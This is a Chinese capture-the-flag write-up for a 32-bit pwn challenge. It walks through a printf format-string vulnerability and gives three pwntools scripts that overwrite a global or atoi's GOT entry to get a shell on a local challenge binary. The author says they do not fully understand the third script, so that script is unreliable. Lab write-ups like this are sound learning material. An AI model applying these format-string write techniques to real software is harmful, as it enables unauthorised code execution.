# [第五空间2019 决赛]PWN5

## 保护

开启了NX和Canary

```shell
$ checksec --file=pwn           
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```



## main函数

```bash
int __cdecl main(int a1)
{
  unsigned int v1; // eax
  int result; // eax
  int fd; // [esp+0h] [ebp-84h]
  char nptr[16]; // [esp+4h] [ebp-80h] BYREF
  char buf[100]; // [esp+14h] [ebp-70h] BYREF
  unsigned int v6; // [esp+78h] [ebp-Ch]
  int *v7; // [esp+7Ch] [ebp-8h]

  v7 = &a1;
  v6 = __readgsdword(0x14u);
  setvbuf(stdout, 0, 2, 0);
  v1 = time(0);
  srand(v1);
  fd = open("/dev/urandom", 0);
  read(fd, &dword_804C044, 4u);
  printf("your name:");
  read(0, buf, 0x63u);
  printf("Hello,");
  printf(buf);
  printf("your passwd:");
  read(0, nptr, 0xFu);
  if ( atoi(nptr) == dword_804C044 )
  {
    puts("ok!!");
    system("/bin/sh");
  }
  else
  {
    puts("fail");
  }
  result = 0;
  if ( __readgsdword(0x14u) != v6 )
    sub_80493D0();
  return result;
}
```

逻辑为取4byte随机值，和用户输入的内容比较，如果相同执行system(/bin/sh)

printf存在格式化字符串漏洞，确认位置在格式化字符串后的第10个参数位置

```bash
# ./pwn 
your name:aaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p
Hello,aaaa-0xffb44588-0x63-(nil)-(nil)-0x3-0xf7f8c950-0xc2-(nil)-0xc30000-0x61616161-0x2d70252d-0x252d7025-0x70252d70
```



## EXP1

思路：

- 直接利用格式化字符串将前面输出的字符串（unk_804C044_addr的地址，4位）长度4，写入unk_804C044_addr的地址，然后输入4就行了

```c
from pwn import *
p=process('./pwn')

unk_804C044_addr=0x0804C044

payload=p32(unk_804C044_addr)+b'%10$n'
p.sendline(payload)

p.sendline('4')
p.interactive()
```



## EXP2

**fmtstr_payload(offset, writes, numbwritten=0, write_size='byte')**

**理解：fmtstr_payload(偏移,{要写入的地址,要写入的值})**

第一个参数表示格式化字符串的偏移；

第二个参数表示需要利用%n写入的数据，采用字典形；

第三个参数表示已经输出的字符个数，这里没有，为0，采用默认值即可；

第四个参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（int），对应着hhn、hn和n，默认值是byte，即按hhn写。

```python
from pwn import *
p = process('./pwn')

unk_804C044 = 0x0804C044
payload=fmtstr_payload(10,{unk_804C044:4})
p.sendlineafter("your name:",payload)
p.sendlineafter("your passwd",str(4))
p.interactive()
```



## EXP3

思路：

- 利用格式化字符串改写atoi的got地址，将其改为system的地址
- 配合之后输入/bin/sh，得到shell

```python
from pwn import *

p = process('./pwn')
elf = ELF('./pwn')

atoi_got = elf.got['atoi']
system_got = elf.got['system']

payload=fmtstr_payload(10,{atoi_got:system_got})

p.sendline(payload)
p.sendline('/bin/sh\x00')

p.interactive()
```



这道题还有些部分没有搞懂，比如EXP3中为什么传入的参数不是system_got而是system_plt
